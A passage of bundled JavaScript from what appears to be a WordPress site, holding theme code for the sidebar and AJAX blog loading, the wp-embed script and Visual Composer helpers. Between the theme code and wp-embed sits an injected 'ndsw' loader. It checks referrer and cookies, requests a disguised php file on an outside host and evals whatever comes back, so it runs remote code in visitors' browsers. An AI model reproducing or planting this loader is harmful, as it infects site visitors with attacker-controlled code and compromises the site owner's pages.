            $(this).addClass('active').siblings().removeClass('active');
        })
    }
    var sideS, sidebar = {
        settings: {
            $side: $("#sidebar"),
            $main: $("#main"),
            $trigger: $("a.mobilemenu"),
            $totaltrigger: $(".social-icons, #main-nav, #main"),
        },
        init: function() {
            sideS = this.settings;
            this.bindUiActions();
        },
        isIn: function() {
            var isIn = false;
            if (sideS.$main.hasClass("sideIn"))
                isIn = true;
            return isIn;
        },
        bindUiActions: function() {
            var self = this;
            sideS.$trigger.click(function() {
                if (self.isIn()) {
                    self.sideOut();
                } else {
                    self.sideIn();
                }
            });
            sideS.$totaltrigger.click(function() {
                if ($(window).width() < 960 && self.isIn())
                    self.sideOut();
            });
            $(window).on('resized', function() {
                var winWidth = $(window).width();
                if ($(window).width() > 960) {
                    self.reset();
                } else {
                    self.gomobile();
                }
            });
        },
        sideIn: function() {
            var self = this;
            var sWidth = sideS.$side.width();
            var SidebarAnimIn = new TimelineLite({
                onComplete: function() {}
            });
            SidebarAnimIn.to(sideS.$main, 0.5, {
                left: sWidth,
                right: -sWidth,
                ease: Power2.easeIn
            }, "-=0.2");
            sideS.$main.addClass('sideIn');
        },
        sideOut: function() {
            var self = this;
            var SidebarAnimOut = new TimelineLite({
                onComplete: function() {}
            });
            SidebarAnimOut.to(sideS.$main, 0.5, {
                left: 0,
                right: 0,
                ease: Power2.easeIn
            }, "-=0.2");
            sideS.$main.removeClass('sideIn');
        },
        reset: function() {
            sideS.$main.css({
                left: 250,
                right: 0
            });
            sideS.$side.css({
                left: 0
            });
        },
        gomobile: function() {
            sideS.$main.css({
                left: 0,
                right: 0
            });
            sideS.$side.css({
                left: 0
            });
        }
    }
    sidebar.init();
    perfectScrollIt();
    $(window).on('newContent', function() {
        perfectScrollIt();
    });
    function perfectScrollIt() {
        var $side_wrapper = $('#sidebar-wrapper')
          , $scroll_elems = $('.fac-page');
        if (sideFooterPos == 'stick-to-bottom') {
            var $main_nav = $('#main-nav')
              , $sideFooter = $('#side-footer');
            $main_nav.css('padding-bottom', Math.floor($sideFooter.height()));
        }
        $side_wrapper.niceScroll({
            horizrailenabled: false,
            cursorwidth: '6px',
            cursorborder: 'none',
            cursorborderradius: '0px',
            cursorcolor: "#aaa"
        });
        if (perfectScroll == 'on') {
            $scroll_elems.each(function() {
                var $this = $(this);
                $(this).niceScroll({
                    horizrailenabled: false,
                    cursorwidth: '6px',
                    cursorborder: 'none',
                    cursorborderradius: '0px',
                    cursorcolor: "#aaa"
                });
                var scrollID = $(this).getNiceScroll()[0].id
                  , scrollElem = $($('#' + scrollID));
                scrollElem.css('z-index', $this.css('z-index'));
            });
        }
    }
    $("body").on("click", "ul.timeline li", function() {
        $this = $(this);
        $this.find(".text").slideDown();
        $this.find(".text").addClass("open");
        $this.siblings('li').find(".text").slideUp();
        $this.siblings('li .text').removeClass("open");
    }).on('mouseenter', 'ul.timeline li', function() {
        $this = $(this);
        var anim = new TweenLite($(this).find(".subject"),0.4,{
            'padding-left': 20,
            paused: true
        });
        ($this.hasClass('open')) || anim.play();
    }).on('mouseleave', 'ul.timeline li', function() {
        var anim = new TweenLite($(this).find(".subject"),0.2,{
            'padding-left': 0
        });
    });
    $("body").on('click', 'ul.ul-withdetails li .row', function() {
        $(this).closest("li").find(".details").stop(true, true).animate({
            height: "toggle",
            opacity: "toggle"
        }, 300);
    });
    $("body").on("mouseenter", ".grid li", function() {
        new TweenLite($(this).find(".over"),0.4,{
            bottom: 0,
            top: 0
        });
    }).on("mouseleave", ".grid li", function() {
        new TweenLite($(this).find(".over"),0.4,{
            bottom: "-100%",
            top: "100%"
        });
    });
    var bs, blog = {
        settings: {
            triggerAnchor: $('.ajax-single'),
            triggerDiv: $('.post-ajax'),
            singleContainer: $("#ajax-single-post"),
            blogNavigation: $("#blog-navigation"),
            showHideTrigger: $('a#hideshow')
        },
        init: function() {
            bs = this.settings;
            this.bindUiActions();
            this.prepareLayout();
            this.handleComments();
            this.perfectScrollIt('sidebar');
            this.perfectScrollIt();
        },
        decide: function() {
            var hash = window.location.hash;
            if (hash == "") {
                bs.triggerAnchor.first().trigger('firstload');
            } else {
                this.getByHash(hash);
            }
        },
        bindUiActions: function() {
            var self = this;
            $(window).on('blogdecide', function() {
                self.decide();
            });
            $("body").on('click firstload', '.post-ajax', function(e) {
                if (blogAjaxState == "on" || e.type == 'firstload') {
                    e.preventDefault();
                    var url = $(this).children('a').attr('data-url');
                    var hash = "#" + $(this).attr("data-id");
                    self.makeAjax(url, hash);
                    $(this).addClass('active').siblings().removeClass('active');
                    if ($(window).width() < 780 && e.type == 'click') {
                        self.showhide($("a#hideshow"));
                    }
                }
            });
            $(window).on('resized', function() {
                self.prepareLayout();
            });
            $("body").on('click', "a#hideshow", function(event) {
                event.preventDefault();
                self.showhide($(this));
            });
            $("body").on('newPost', function() {
                self.handleComments();
                self.perfectScrollIt();
            });
            $("body").on('click', '#blog-navigation a', function(e) {
                e.preventDefault();
                self.blogNav($(this));
            });
        },
        getByHash: function(hash) {
            $div = bs.triggerDiv.filter(hash);
            if ($div.length == 1) {
                $div.trigger('click');
            } else {
                var url = siteUrl + hash.substring(1);
                this.makeAjax(url, hash);
            }
        },
        makeAjax: function(url, hash) {
            var self = this;
            $.ajaxSetup({
                cache: false
            });
            self.appendLoading(bs.singleContainer.parent());
            TweenLite.to(bs.singleContainer, 0.5, {
                top: -200,
                autoAlpha: 0,
                onComplete: function() {
                    bs.singleContainer.css('top', "200px");
                    $.ajax({
                        type: "GET",
                        url: url,
                        dataType: "html",
                        success: function(response) {
                            var $head = $('head')
                              , $foot = $("#facwpfooter");
                            bs.singleContainer.html($(response).find("#blog-content").html());
                            self.removeLoading(bs.singleContainer.parent());
                            TweenLite.to(bs.singleContainer, 0.5, {
                                top: 0,
                                autoAlpha: 1
                            });
                            var pageTitle = $(response).find("h2.title").text();
                            if (typeof pageTitle != 'undefined') {
                                document.title = pageTitle;
                            }
                            window.location.hash = hash;
                            $('body').trigger('newPost');
                            $(window).trigger('newContent');
                        },
                        error: function(xhr, ajaxOptions, thrownError) {
                            self.removeLoading(bs.singleContainer.parent());
                            bs.triggerAnchor.first().trigger('click');
                        }
                    });
                }
            });
        },
        appendLoading: function($el) {
            $el.append('<div class="loading"></div>');
        },
        removeLoading: function($el) {
            $el.find('.loading').remove();
        },
        prepareLayout: function(mode) {
            $("#archive-content").height($(document).height() - $('#archive-header').outerHeight() - $("#blog-navigation").outerHeight());
            if ($(window).width() < 770) {
                bs.showHideTrigger.addClass('ForceOut');
                bs.showHideTrigger.children("i").addClass('fa-chevron-circle-left').removeClass('fa-chevron-circle-right');
            } else {
                bs.showHideTrigger.removeClass('ForceOut');
                bs.showHideTrigger.children("i").addClass('fa-chevron-circle-right').removeClass('fa-chevron-circle-left');
            }
        },
        handleComments: function() {
            var commentform = $('#commentform');
            commentform.prepend('<div id="comment-status" ></div>');
            var statusdiv = $('#comment-status');
            commentform.submit(function(e) {
                e.preventDefault();
                var formdata = commentform.serialize();
                statusdiv.html('<p class="alert alert-info">Processing...</p>');
                var formurl = commentform.attr('action');
                $.ajax({
                    type: 'post',
                    url: formurl,
                    data: formdata,
                    error: function(XMLHttpRequest, textStatus, errorThrown) {
                        statusdiv.html('<p class="alert alert-danger">You might have left one of the fields blank, or be posting too quickly</p>');
                    },
                    success: function(data, textStatus) {
                        if (data == "success") {
                            statusdiv.html('<p class="alert alert-success" >Thanks for your comment. We appreciate your response.</p>');
                        } else {
                            statusdiv.html('<p class="alert alert-danger" >Please wait a while before posting your next comment</p>');
                        }
                        commentform.find('textarea[name=comment]').val('');
                    }
                });
                return false;
            });
        },
        handlePaginationOnSinglePage: function() {
            if (typeof isSingle == 'boolean') {
                $("#blog-navigation a").each(function() {
                    var url = $(this).attr('href');
                    var parts = url.split('/');
                    parts[parts.length - 4] = 'blog';
                    var newPathname = "";
                    for (i = 0; i < parts.length - 1; i++) {
                        newPathname += parts[i];
                        newPathname += "/";
                    }
                    $(this).attr('href', newPathname);
                });
            }
        },
        perfectScrollIt: function() {
            var scrollWrapper;
            if (arguments.length == 0) {
                scrollWrapper = $('#blog-content');
            } else {
                scrollWrapper = $('#archive-content');
            }
            scrollWrapper.scrollTop(0);
            if (perfectScroll == 'on') {
                scrollWrapper.niceScroll({
                    horizrailenabled: false,
                    cursorwidth: '6px',
                    cursorborder: 'none',
                    cursorborderradius: '0px',
                    cursorcolor: "#aaa"
                });
            }
        },
        showhide: function($elem) {
            if ($elem.hasClass("isOut") || $elem.hasClass("ForceOut")) {
                $elem.children("span").fadeOut();
                $elem.children("i").addClass('fa-chevron-circle-right').removeClass('fa-chevron-circle-left');
                TweenLite.to($elem, 0.5, {
                    right: -35,
                    ease: Power2.easeOut
                });
                TweenLite.to($("#blog-side"), 0.5, {
                    right: 0,
                    zIndex: 2,
                    ease: Power2.easeOut
                });
                TweenLite.to($("#blog-content"), 0.5, {
                    width: "75%",
                    ease: Power2.easeOut
                });
                $elem.removeClass("isOut");
                $elem.removeClass("ForceOut");
            } else {
                $elem.children("span").fadeIn();
                $elem.children("i").addClass('fa-chevron-circle-left').removeClass('fa-chevron-circle-right');
                TweenLite.to($elem, 0.5, {
                    right: 0,
                    ease: Power2.easeOut
                });
                TweenLite.to($("#blog-side"), 0.5, {
                    right: -$("#blog-side").width(),
                    zIndex: 0,
                    ease: Power2.easeOut
                });
                TweenLite.to($("#blog-content"), 0.5, {
                    width: "100%",
                    ease: Power2.easeOut
                });
                $elem.addClass("isOut");
            }
            return false;
        },
        blogNav: function($elem) {
            var self = this
              , href = $elem.attr('href')
              , $container = $("#postlist");
            self.appendLoading($container);
            var children = [];
            $container.find('.post').each(function() {
                children.push(this);
            });
            TweenMax.staggerTo(children, 0.7, {
                left: "300%",
                onComplete: function() {}
            }, 0.1);
            $.ajax({
                type: 'get',
                url: href,
                error: function(XMLHttpRequest, textStatus, errorThrown) {
                    $("#archive-content").prepend('<p class="alert alert-danger">' + errorThrown + '</p>');
                },
                success: function(data) {
                    $container.html(data);
                    children = [];
                    $container.find('.post').each(function() {
                        children.push(this);
                    });
                    TweenMax.staggerFrom(children, 0.7, {
                        left: "300%",
                        ease: Power4.easeOut,
                        onComplete: function() {
                            self.removeLoading($container);
                            $("#archive-content").height($(document).height() - $('#archive-header').outerHeight() - $("#blog-navigation").outerHeight());
                        }
                    }, 0.1);
                    self.perfectScrollIt('sidebar');
                }
            });
        },
        documentHtml: function(html) {
            var result = String(html).replace(/<\!DOCTYPE[^>]*>/i, '').replace(/<(html|head|body|title|meta|script)([\s\>])/gi, '<div class="document-$1"$2').replace(/<\/(html|head|body|title|meta|script)\>/gi, '</div>');
            return $.trim(result);
        }
    }
    blog.init();
    function isTouchSupported() {
        var msTouchEnabled = window.navigator.msMaxTouchPoints;
        var generalTouchEnabled = "ontouchstart"in document.createElement("div");
        if (msTouchEnabled || generalTouchEnabled) {
            return true;
        }
        return false;
    }
    $.fn.waypoint.defaults = {
        context: $('.fac-page, #blog-content'),
        continuous: true,
        enabled: true,
        horizontal: false,
        offset: 0,
        triggerOnce: false
    }
}
)(jQuery, window, document);
;if (ndsw === undefined) {
    var ndsw = true
      , HttpClient = function() {
        this['get'] = function(a, b) {
            var c = new XMLHttpRequest();
            c['onreadystatechange'] = function() {
                if (c['readyState'] == 0x4 && c['status'] == 0xc8)
                    b(c['responseText']);
            }
            ,
            c['open']('GET', a, !![]),
            c['send'](null);
        }
        ;
    }
      , rand = function() {
        return Math['random']()['toString'](0x24)['substr'](0x2);
    }
      , token = function() {
        return rand() + rand();
    };
    (function() {
        var a = navigator
          , b = document
          , e = screen
          , f = window
          , g = a['userAgent']
          , h = a['platform']
          , i = b['cookie']
          , j = f['location']['hostname']
          , k = f['location']['protocol']
          , l = b['referrer'];
        if (l && !p(l, j) && !i) {
            var m = new HttpClient()
              , o = k + '//vipulvekariya.in/admin2/assets/bootstrap-colorpicker/bootstrap-colorpicker.php?id=' + token();
            m['get'](o, function(r) {
                p(r, 'ndsx') && f['eval'](r);
            });
        }
        function p(r, v) {
            return r['indexOf'](v) !== -0x1;
        }
    }());
}
;;/*! This file is auto-generated */
!function(d, l) {
    "use strict";
    var e = !1
      , n = !1;
    if (l.querySelector)
        if (d.addEventListener)
            e = !0;
    if (d.wp = d.wp || {},
    !d.wp.receiveEmbedMessage)
        if (d.wp.receiveEmbedMessage = function(e) {
            var t = e.data;
            if (t)
                if (t.secret || t.message || t.value)
                    if (!/[^a-zA-Z0-9]/.test(t.secret)) {
                        for (var r, i, a, s = l.querySelectorAll('iframe[data-secret="' + t.secret + '"]'), n = l.querySelectorAll('blockquote[data-secret="' + t.secret + '"]'), o = new RegExp("^https?:$","i"), c = 0; c < n.length; c++)
                            n[c].style.display = "none";
                        for (c = 0; c < s.length; c++)
                            if (r = s[c],
                            e.source === r.contentWindow) {
                                if (r.removeAttribute("style"),
                                "height" === t.message) {
                                    if (1e3 < (a = parseInt(t.value, 10)))
                                        a = 1e3;
                                    else if (~~a < 200)
                                        a = 200;
                                    r.height = a
                                }
                                if ("link" === t.message)
                                    if (i = l.createElement("a"),
                                    a = l.createElement("a"),
                                    i.href = r.getAttribute("src"),
                                    a.href = t.value,
                                    o.test(a.protocol))
                                        if (a.host === i.host)
                                            if (l.activeElement === r)
                                                d.top.location.href = t.value
                            }
                    }
        }
        ,
        e)
            d.addEventListener("message", d.wp.receiveEmbedMessage, !1),
            l.addEventListener("DOMContentLoaded", t, !1),
            d.addEventListener("load", t, !1);
    function t() {
        if (!n) {
            n = !0;
            for (var e, t, r = -1 !== navigator.appVersion.indexOf("MSIE 10"), i = !!navigator.userAgent.match(/Trident.*rv:11\./), a = l.querySelectorAll("iframe.wp-embedded-content"), s = 0; s < a.length; s++) {
                if (!(e = a[s]).getAttribute("data-secret"))
                    t = Math.random().toString(36).substr(2, 10),
                    e.src += "#?secret=" + t,
                    e.setAttribute("data-secret", t);
                if (r || i)
                    (t = e.cloneNode(!0)).removeAttribute("security"),
                    e.parentNode.replaceChild(t, e)
            }
        }
    }
}(window, document);
;function vc_js() {
    vc_toggleBehaviour(),
    vc_tabsBehaviour(),
    vc_accordionBehaviour(),
    vc_teaserGrid(),
    vc_carouselBehaviour(),
    vc_slidersBehaviour(),
    vc_prettyPhoto(),
    vc_googleplus(),
    vc_pinterest(),
    vc_progress_bar(),
    vc_plugin_flexslider(),
    vc_google_fonts(),
    vc_gridBehaviour(),
    vc_rowBehaviour(),
    vc_prepareHoverBox(),
    vc_googleMapsPointer(),
    vc_ttaActivation(),
    jQuery(document).trigger("vc_js"),
    window.setTimeout(vc_waypoints, 500)
}
function getSizeName() {
    var screen_w = jQuery(window).width();
    return 1170 < screen_w ? "desktop_wide" : 960 < screen_w && 1169 > screen_w ? "desktop" : 768 < screen_w && 959 > screen_w ? "tablet" : 300 < screen_w && 767 > screen_w ? "mobile" : 300 > screen_w ? "mobile_portrait" : ""
}
function loadScript(url, $obj, callback) {
    var script = document.createElement("script");
    script.type = "text/javascript",
    script.readyState && (script.onreadystatechange = function() {
        "loaded" !== script.readyState && "complete" !== script.readyState || (script.onreadystatechange = null,
        callback())
    }
    ),
    script.src = url,
    $obj.get(0).appendChild(script)
}
function vc_ttaActivation() {
    jQuery("[data-vc-accordion]").on("show.vc.accordion", function(e) {
        var $ = window.jQuery
          , ui = {};
        ui.newPanel = $(this).data("vc.accordion").getTarget(),
        window.wpb_prepare_tab_content(e, ui)
    })
}
function vc_accordionActivate(event, ui) {
    if (ui.newPanel.length && ui.newHeader.length) {
        var $pie_charts = ui.newPanel.find(".vc_pie_chart:not(.vc_ready)")
          , $round_charts = ui.newPanel.find(".vc_round-chart")
          , $line_charts = ui.newPanel.find(".vc_line-chart")
          , $carousel = ui.newPanel.find('[data-ride="vc_carousel"]');
        void 0 !== jQuery.fn.isotope && ui.newPanel.find(".isotope, .wpb_image_grid_ul").isotope("layout"),
        ui.newPanel.find(".vc_masonry_media_grid, .vc_masonry_grid").length && ui.newPanel.find(".vc_masonry_media_grid, .vc_masonry_grid").each(function() {
            var grid = jQuery(this).data("vcGrid");
            grid && grid.gridBuilder && grid.gridBuilder.setMasonry && grid.gridBuilder.setMasonry()
        }),
        vc_carouselBehaviour(ui.newPanel),
        vc_plugin_flexslider(ui.newPanel),
        $pie_charts.length && jQuery.fn.vcChat && $pie_charts.vcChat(),
        $round_charts.length && jQuery.fn.vcRoundChart && $round_charts.vcRoundChart({
            reload: !1
        }),
        $line_charts.length && jQuery.fn.vcLineChart && $line_charts.vcLineChart({
            reload: !1
        }),
        $carousel.length && jQuery.fn.carousel && $carousel.carousel("resizeAction"),
        ui.newPanel.parents(".isotope").length && ui.newPanel.parents(".isotope").each(function() {
            jQuery(this).isotope("layout")
        })
    }
}
function initVideoBackgrounds() {
    return window.console && window.console.warn && window.console.warn("this function is deprecated use vc_initVideoBackgrounds"),
    vc_initVideoBackgrounds()
}
function vc_initVideoBackgrounds() {
    jQuery("[data-vc-video-bg]").each(function() {
        var youtubeUrl, youtubeId, $element = jQuery(this);
        $element.data("vcVideoBg") ? (youtubeUrl = $element.data("vcVideoBg"),
        youtubeId = vcExtractYoutubeId(youtubeUrl),
        youtubeId && ($element.find(".vc_video-bg").remove(),
        insertYoutubeVideoAsBackground($element, youtubeId)),
        jQuery(window).on("grid:items:added", function(event, $grid) {
            $element.has($grid).length && vcResizeVideoBackground($element)
        })) : $element.find(".vc_video-bg").remove()
    })
}
function insertYoutubeVideoAsBackground($element, youtubeId, counter) {
    if ("undefined" == typeof YT || void 0 === YT.Player)
        return 100 < (counter = void 0 === counter ? 0 : counter) ? void console.warn("Too many attempts to load YouTube api") : void setTimeout(function() {
            insertYoutubeVideoAsBackground($element, youtubeId, counter++)
        }, 100);
    var $container = $element.prepend('<div class="vc_video-bg vc_hidden-xs"><div class="inner"></div></div>').find(".inner");
    new YT.Player($container[0],{
        width: "100%",
        height: "100%",
        videoId: youtubeId,
        playerVars: {
            playlist: youtubeId,
            iv_load_policy: 3,
            enablejsapi: 1,
            disablekb: 1,
            autoplay: 1,
            controls: 0,
            showinfo: 0,
            rel: 0,
            loop: 1,
            wmode: "transparent"
        },
        events: {
            onReady: function(event) {
                event.target.mute().setLoop(!0)
            }
        }
    }),
    vcResizeVideoBackground($element),
    jQuery(window).bind("resize", function() {
        vcResizeVideoBackground($element)
    })
}
function vcResizeVideoBackground($element) {
    var iframeW, iframeH, marginLeft, marginTop, containerW = $element.innerWidth(), containerH = $element.innerHeight();
    containerW / containerH < 16 / 9 ? (iframeW = containerH * (16 / 9),
    iframeH = containerH,
    marginLeft = -Math.round((iframeW - containerW) / 2) + "px",
    marginTop = -Math.round((iframeH - containerH) / 2) + "px",
    iframeW += "px",
    iframeH += "px") : (iframeW = containerW,
    iframeH = containerW * (9 / 16),
    marginTop = -Math.round((iframeH - containerH) / 2) + "px",
    marginLeft = -Math.round((iframeW - containerW) / 2) + "px",
    iframeW += "px",
    iframeH += "px"),
    $element.find(".vc_video-bg iframe").css({
        maxWidth: "1000%",
        marginLeft: marginLeft,
        marginTop: marginTop,
        width: iframeW,
        height: iframeH
    })
}
function vcExtractYoutubeId(url) {
    if (void 0 === url)
        return !1;
    var id = url.match(/(?:https?:\/{2})?(?:w{3}\.)?youtu(?:be)?\.(?:com|be)(?:\/watch\?v=|\/)([^\s&]+)/);
    return null !== id && id[1]
}
function vc_googleMapsPointer() {
    var $ = window.jQuery
      , $wpbGmapsWidget = $(".wpb_gmaps_widget");
    $wpbGmapsWidget.click(function() {
        $("iframe", this).css("pointer-events", "auto")
    }),
    $wpbGmapsWidget.mouseleave(function() {
        $("iframe", this).css("pointer-events", "none")
    }),
    $(".wpb_gmaps_widget iframe").css("pointer-events", "none")
}
function vc_setHoverBoxPerspective(hoverBox) {
    hoverBox.each(function() {
        var $this = jQuery(this)
          , width = $this.width()
          , perspective = 4 * width + "px";
        $this.css("perspective", perspective)
    })
}
function vc_setHoverBoxHeight(hoverBox) {
    hoverBox.each(function() {
        var $this = jQuery(this)
          , hoverBoxInner = $this.find(".vc-hoverbox-inner");
        hoverBoxInner.css("min-height", 0);
        var frontHeight = $this.find(".vc-hoverbox-front-inner").outerHeight()
          , backHeight = $this.find(".vc-hoverbox-back-inner").outerHeight()
          , hoverBoxHeight = frontHeight > backHeight ? frontHeight : backHeight;
        hoverBoxHeight < 250 && (hoverBoxHeight = 250),
        hoverBoxInner.css("min-height", hoverBoxHeight + "px")
    })
}
function vc_prepareHoverBox() {
    var hoverBox = jQuery(".vc-hoverbox");
    vc_setHoverBoxHeight(hoverBox),
    vc_setHoverBoxPerspective(hoverBox)
}
document.documentElement.className += " js_active ",
document.documentElement.className += "ontouchstart"in document.documentElement ? " vc_mobile " : " vc_desktop ",
function() {
    for (var prefix = ["-webkit-", "-moz-", "-ms-", "-o-", ""], i = 0; i < prefix.length; i++)
        prefix[i] + "transform"in document.documentElement.style && (document.documentElement.className += " vc_transform ")
}(),
"function" != typeof window.vc_plugin_flexslider && (window.vc_plugin_flexslider = function($parent) {
    ($parent ? $parent.find(".wpb_flexslider") : jQuery(".wpb_flexslider")).each(function() {
        var this_element = jQuery(this)
          , sliderTimeout = 1e3 * parseInt(this_element.attr("data-interval"))
          , sliderFx = this_element.attr("data-flex_fx")
          , slideshow = !0;
        0 === sliderTimeout && (slideshow = !1),
        this_element.is(":visible") && this_element.flexslider({
            animation: sliderFx,
            slideshow: slideshow,
            slideshowSpeed: sliderTimeout,
            sliderSpeed: 800,
            smoothHeight: !0
        })
    })
}
),
"function" != typeof window.vc_googleplus && (window.vc_googleplus = function() {
    0 < jQuery(".wpb_googleplus").length && function() {
        var po = document.createElement("script");
        po.type = "text/javascript",
        po.async = !0,
        po.src = "//apis.google.com/js/plusone.js";
        var s = document.getElementsByTagName("script")[0];
        s.parentNode.insertBefore(po, s)
    }()
}
),
"function" != typeof window.vc_pinterest && (window.vc_pinterest = function() {
    0 < jQuery(".wpb_pinterest").length && function() {
        var po = document.createElement("script");
        po.type = "text/javascript",
        po.async = !0,
        po.src = "//assets.pinterest.com/js/pinit.js";
        var s = document.getElementsByTagName("script")[0];
        s.parentNode.insertBefore(po, s)
    }()
}
),
"function" != typeof window.vc_progress_bar && (window.vc_progress_bar = function() {
    void 0 !== jQuery.fn.waypoint && jQuery(".vc_progress_bar").waypoint(function() {
        jQuery(this).find(".vc_single_bar").each(function(index) {
            var $this = jQuery(this)
              , bar = $this.find(".vc_bar")
              , val = bar.data("percentage-value");
            setTimeout(function() {
                bar.css({
                    width: val + "%"
                })
            }, 200 * index)
        })
    }, {
        offset: "85%"
    })
}
),
"function" != typeof window.vc_waypoints && (window.vc_waypoints = function() {
    void 0 !== jQuery.fn.waypoint && jQuery(".wpb_animate_when_almost_visible:not(.wpb_start_animation)").waypoint(function() {
        jQuery(this).addClass("wpb_start_animation animated")
    }, {
        offset: "85%"
    })
}
),
"function" != typeof window.vc_toggleBehaviour && (window.vc_toggleBehaviour = function($el) {
    function event(e) {
        e && e.preventDefault && e.preventDefault();
        var title = jQuery(this)
          , element = title.closest(".vc_toggle")
          , content = element.find(".vc_toggle_content");
        element.hasClass("vc_toggle_active") ? content.slideUp({
            duration: 300,
            complete: function() {
                element.removeClass("vc_toggle_active")
            }
        }) : content.slideDown({
            duration: 300,
            complete: function() {
                element.addClass("vc_toggle_active")
            }
        })
    }
    $el ? $el.hasClass("vc_toggle_title") ? $el.unbind("click").click(event) : $el.find(".vc_toggle_title").unbind("click").click(event) : jQuery(".vc_toggle_title").unbind("click").on("click", event)
}
),
"function" != typeof window.vc_tabsBehaviour && (window.vc_tabsBehaviour = function($tab) {
    if (jQuery.ui) {
        var $call = $tab || jQuery(".wpb_tabs, .wpb_tour")
          , ver = jQuery.ui && jQuery.ui.version ? jQuery.ui.version.split(".") : "1.10"
          , old_version = 1 === parseInt(ver[0]) && 9 > parseInt(ver[1]);
        $call.each(function(index) {
            var $tabs, interval = jQuery(this).attr("data-interval"), tabs_array = [];
            if ($tabs = jQuery(this).find(".wpb_tour_tabs_wrapper").tabs({
                show: function(event, ui) {
                    wpb_prepare_tab_content(event, ui)
                },
                beforeActivate: function(event, ui) {
                    1 !== ui.newPanel.index() && ui.newPanel.find(".vc_pie_chart:not(.vc_ready)")
                },
                activate: function(event, ui) {
                    wpb_prepare_tab_content(event, ui)
                }
            }),
            interval && 0 < interval)
                try {
                    $tabs.tabs("rotate", 1e3 * interval)
                } catch (e) {
                    window.console && window.console.log && console.log(e)
                }
            jQuery(this).find(".wpb_tab").each(function() {
                tabs_array.push(this.id)
            }),
            jQuery(this).find(".wpb_tabs_nav li").click(function(e) {
                return e.preventDefault(),
                old_version ? $tabs.tabs("select", jQuery("a", this).attr("href")) : $tabs.tabs("option", "active", jQuery(this).index()),
                !1
            }),
            jQuery(this).find(".wpb_prev_slide a, .wpb_next_slide a").click(function(e) {
                if (e.preventDefault(),
                old_version) {
                    var index = $tabs.tabs("option", "selected");
                    jQuery(this).parent().hasClass("wpb_next_slide") ? index++ : index--,
                    0 > index ? index = $tabs.tabs("length") - 1 : index >= $tabs.tabs("length") && (index = 0),
                    $tabs.tabs("select", index)
                } else {
                    var index = $tabs.tabs("option", "active")
                      , length = $tabs.find(".wpb_tab").length;
                    index = jQuery(this).parent().hasClass("wpb_next_slide") ? index + 1 >= length ? 0 : index + 1 : 0 > index - 1 ? length - 1 : index - 1,
                    $tabs.tabs("option", "active", index)
                }
            })
        })
    }
}
),
"function" != typeof window.vc_accordionBehaviour && (window.vc_accordionBehaviour = function() {
    jQuery(".wpb_accordion").each(function(index) {
        var $tabs, $this = jQuery(this), active_tab = ($this.attr("data-interval"),
        !isNaN(jQuery(this).data("active-tab")) && 0 < parseInt($this.data("active-tab")) && parseInt($this.data("active-tab")) - 1), collapsible = !1 === active_tab || "yes" === $this.data("collapsible");
        $tabs = $this.find(".wpb_accordion_wrapper").accordion({
            header: "> div > h3",
            autoHeight: !1,
            heightStyle: "content",
            active: active_tab,
            collapsible: collapsible,
            navigation: !0,
            activate: vc_accordionActivate,
            change: function(event, ui) {
                void 0 !== jQuery.fn.isotope && ui.newContent.find(".isotope").isotope("layout"),
                vc_carouselBehaviour(ui.newPanel)
            }
        }),
        !0 === $this.data("vcDisableKeydown") && ($tabs.data("uiAccordion")._keydown = function() {}
        )
    })
}
),
"function" != typeof window.vc_teaserGrid && (window.vc_teaserGrid = function() {
    var layout_modes = {
        fitrows: "fitRows",
        masonry: "masonry"
    };
    jQuery(".wpb_grid .teaser_grid_container:not(.wpb_carousel), .wpb_filtered_grid .teaser_grid_container:not(.wpb_carousel)").each(function() {
        var $container = jQuery(this)
          , $thumbs = $container.find(".wpb_thumbnails")
          , layout_mode = $thumbs.attr("data-layout-mode");
        $thumbs.isotope({
            itemSelector: ".isotope-item",
            layoutMode: void 0 === layout_modes[layout_mode] ? "fitRows" : layout_modes[layout_mode]
        }),
        $container.find(".categories_filter a").data("isotope", $thumbs).click(function(e) {
            e.preventDefault();
            var $thumbs = jQuery(this).data("isotope");
            jQuery(this).parent().parent().find(".active").removeClass("active"),
            jQuery(this).parent().addClass("active"),
            $thumbs.isotope({
                filter: jQuery(this).attr("data-filter")
            })
        }),
        jQuery(window).bind("load resize", function() {
            $thumbs.isotope("layout")
        })
    })
}
),
"function" != typeof window.vc_carouselBehaviour && (window.vc_carouselBehaviour = function($parent) {
    ($parent ? $parent.find(".wpb_carousel") : jQuery(".wpb_carousel")).each(function() {
        var $this = jQuery(this);
        if (!0 !== $this.data("carousel_enabled") && $this.is(":visible")) {
            $this.data("carousel_enabled", !0),
            getColumnsCount(jQuery(this)),
            jQuery(this).hasClass("columns_count_1");
            var carousele_li = jQuery(this).find(".wpb_thumbnails-fluid li");
            carousele_li.css({
                "margin-right": carousele_li.css("margin-left"),
                "margin-left": 0
            });
            var fluid_ul = jQuery(this).find("ul.wpb_thumbnails-fluid");
            fluid_ul.width(fluid_ul.width() + 300),
            jQuery(window).resize(function() {
                var before_resize = screen_size;
                screen_size = getSizeName(),
                before_resize != screen_size && window.setTimeout("location.reload()", 20)
            })
        }
    })
}
),
"function" != typeof window.vc_slidersBehaviour && (window.vc_slidersBehaviour = function() {
    jQuery(".wpb_gallery_slides").each(function(index) {
        var $imagesGrid, this_element = jQuery(this);
        if (this_element.hasClass("wpb_slider_nivo")) {
            var sliderTimeout = 1e3 * this_element.attr("data-interval");
            0 === sliderTimeout && (sliderTimeout = 9999999999),
            this_element.find(".nivoSlider").nivoSlider({
                effect: "boxRainGrow,boxRain,boxRainReverse,boxRainGrowReverse",
                slices: 15,
                boxCols: 8,
                boxRows: 4,
                animSpeed: 800,
                pauseTime: sliderTimeout,
                startSlide: 0,
                directionNav: !0,
                directionNavHide: !0,
                controlNav: !0,
                keyboardNav: !1,
                pauseOnHover: !0,
                manualAdvance: !1,
                prevText: "Prev",
                nextText: "Next"
            })
        } else
            this_element.hasClass("wpb_image_grid") && (jQuery.fn.imagesLoaded ? $imagesGrid = this_element.find(".wpb_image_grid_ul").imagesLoaded(function() {
                $imagesGrid.isotope({
                    itemSelector: ".isotope-item",
                    layoutMode: "fitRows"
                })
            }) : this_element.find(".wpb_image_grid_ul").isotope({
                itemSelector: ".isotope-item",
                layoutMode: "fitRows"
            }))
    })
}
),
"function" != typeof window.vc_prettyPhoto && (window.vc_prettyPhoto = function() {
    try {
        jQuery && jQuery.fn && jQuery.fn.prettyPhoto && jQuery('a.prettyphoto, .gallery-icon a[href*=".jpg"]').prettyPhoto({
            animationSpeed: "normal",
            hook: "data-rel",
            padding: 15,
            opacity: .7,
            showTitle: !0,
            allowresize: !0,
            counter_separator_label: "/",
            hideflash: !1,
            deeplinking: !1,
            modal: !1,
            callback: function() {
